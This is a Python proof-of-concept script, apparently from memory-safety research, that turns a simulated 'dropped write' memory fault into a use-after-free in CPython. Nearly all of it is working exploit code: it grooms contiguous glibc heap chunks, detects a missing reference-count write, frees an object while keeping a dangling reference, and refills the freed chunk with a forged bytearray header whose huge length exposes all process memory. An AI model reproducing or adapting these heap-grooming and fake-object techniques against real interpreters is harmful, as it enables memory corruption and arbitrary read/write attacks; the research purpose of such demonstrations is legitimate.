"""
Achieve UAF in cpython under "dropped write" fault model - see simulate_dropped_write.py
"""

import os

def p64(n: int) -> bytes:
	return n.to_bytes(8, "little")

# assumes glibc allocator
def alloc_contiguous_chunks(chunk_size: int, count: int) -> list:
	assert chunk_size % 0x10 == 0  # padding size is only correct under this assumption
	data = []
	runlen = 1
	while runlen < count:
		data.append(os.urandom(chunk_size-0x21-0x10)) # 0x20 = bytes header, 0x10 = glibc padding/metadata
		if len(data) > 1 and id(data[-1]) == id(data[-2]) + chunk_size:
			runlen += 1
		else:
			runlen = 1
		if len(data) > 1000:
			raise Exception("contigous alloc failed")
	return data[-count:]

CHUNK = 0x1200

guard1, hole1, hole2, guard2 = alloc_contiguous_chunks(CHUNK, 4)

# these arrays should fit in LLC (sizeof ptr x array len)
a = [hole1] * 0x1000
b = [hole2] * 0x1000
del hole1, hole2 # the arrays are now the only remaining refs

# but this one should exceed LLC
buf = [a[0]] * 0x400000

print(f"waiting for dropped writes at pid {os.getpid()}")
while True:
	a, b = b, a
	for i in range(0, len(buf), len(a)):
		buf[i:i+len(a)] = a
	if b[0] in buf:
		i = buf.index(b[0])
		print(f"dropped write detected at offset {i}!")
		# buf[i] is a reference to b's obj that is not tracked by refcount!
		break

del b # free b's obj (after refcount goes to 0), making a hole
filler = bytearray(0x1200-0x10) # immediately fill the hole

# craft a fake bytearray that contains all of memory
filler[0x00:0x08] = p64(123) # refcount
filler[0x08:0x10] = p64(id(bytearray)) # type
filler[0x10:0x18] = p64((1<<63)-1) # length
# everything else still zero, including the buffer pointer

# buf[i] should now be a dangling reference to filler's buffer
fakeobj = buf[i]
if type(fakeobj) is bytearray:
	print("fakeobj worked!")
else:
	print("fakeobj failed...")
	exit()

# deref 0xdeafbeef (should segfault)
fakeobj[0xdeadbeef]
